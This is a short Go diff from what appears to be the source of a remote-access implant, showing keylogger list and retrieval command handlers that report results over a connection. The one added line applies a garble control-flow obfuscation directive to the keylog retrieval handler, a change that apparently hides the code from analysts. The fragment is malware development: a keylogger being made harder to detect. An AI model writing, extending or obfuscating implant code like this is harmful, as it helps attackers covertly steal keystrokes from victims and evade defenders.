@@ -50,6 +50,7 @@ func HandleKeylogList(ctx context.Context, env *runtime.Env, cmdID string) error
 }
 
 func HandleKeylogRetrieve(ctx context.Context, env *runtime.Env, cmdID string, filename string) error {
+	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
 	if env.Keylogger == nil {
 		return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
 			"type":      "command_result",
